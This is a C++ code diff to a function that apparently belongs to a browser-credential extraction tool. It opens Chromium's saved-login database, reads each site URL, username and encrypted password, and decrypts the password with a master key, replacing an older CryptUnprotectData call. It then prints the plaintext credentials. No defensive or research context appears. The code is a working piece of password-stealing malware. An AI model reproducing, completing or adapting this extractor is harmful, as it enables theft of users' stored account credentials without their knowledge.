@@ -24,7 +24,6 @@ ChromiumProcessor::~ChromiumProcessor()
 int ChromiumProcessor::ExtractChromiumPasswords()
 {
     cout<<"ChromiumProcessor::ExtractChromiumPasswords()"<<endl;
-    stringstream dump(string(""));
     if(experimental::filesystem::exists(pass_path))
     {
         int rc=sqlite3_open(pass_path.c_str(), &ChromiumDB);
@@ -51,7 +50,7 @@ int ChromiumProcessor::ExtractChromiumPasswords()
 
     int rc;
     unsigned long int i;
-    string sql="SELECT action_url, username_value, password_value FROM logins";
+    string sql="SELECT origin_url, action_url, username_value, password_value FROM logins";
     sqlite3_stmt *pStmt;
 
     rc=sqlite3_prepare(ChromiumDB, sql.c_str(), -1, &pStmt, 0);
@@ -65,21 +64,44 @@ int ChromiumProcessor::ExtractChromiumPasswords()
     //cout<<"RC: "<<rc<<endl;
     while(rc==SQLITE_ROW)
     {
-        dump<<sqlite3_column_text(pStmt, 0)<<endl;
-        dump<<(char *)sqlite3_column_text(pStmt, 1)<<endl;
+        string newPW;
+        cout<<sqlite3_column_text(pStmt, 0)<<endl;
+        cout<<sqlite3_column_text(pStmt, 1)<<endl;
+        cout<<sqlite3_column_text(pStmt, 2)<<endl;
 
         DATA_BLOB encryptedPass, decryptedPass;
+        decryptedPass.pbData=nullptr;
 
-        encryptedPass.cbData=(DWORD)sqlite3_column_bytes(pStmt, 2);
-        encryptedPass.pbData=(byte *)malloc(encryptedPass.cbData);
+        encryptedPass.cbData=sqlite3_column_bytes(pStmt, 3);
+        encryptedPass.pbData=new unsigned char[encryptedPass.cbData];
 
-        memcpy(encryptedPass.pbData, sqlite3_column_blob(pStmt, 2), (int)encryptedPass.cbData);
+        memcpy(encryptedPass.pbData, sqlite3_column_blob(pStmt, 3), encryptedPass.cbData);
 
-        CryptUnprotectData(&encryptedPass, NULL, NULL, NULL, NULL, 0, &decryptedPass);
+        newPW=EasyDecrypt(&encryptedPass, MasterKey);
 
+        for(i=0; encryptedPass.pbData!=nullptr && i<encryptedPass.cbData; i++)
+        {
+            fprintf(stdout, "%.2x", encryptedPass.pbData[i]&0xFF);
+        }
+        fprintf(stdout, "<encryptedPass\n");
+        fprintf(stdout, "%s < encryptedPass\n", encryptedPass.pbData);
 
+        //CryptUnprotectData(&encryptedPass, NULL, NULL, NULL, NULL, 0, &decryptedPass);
 
-        free(encryptedPass.pbData);
+        for(i=0; decryptedPass.pbData && i<decryptedPass.cbData; i++)
+        {
+            fprintf(stdout, "%.2x", decryptedPass.pbData[i]&0xFF);
+        }
+        if(i)
+        {
+        }
+        fprintf(stdout, "\n%s < decryptedPass!\n", newPW.c_str());
+
+        delete [] encryptedPass.pbData;
+        if(decryptedPass.pbData)
+        {
+            LocalFree(decryptedPass.pbData);
+        }
         rc=sqlite3_step(pStmt);
     }
     rc=sqlite3_finalize(pStmt);
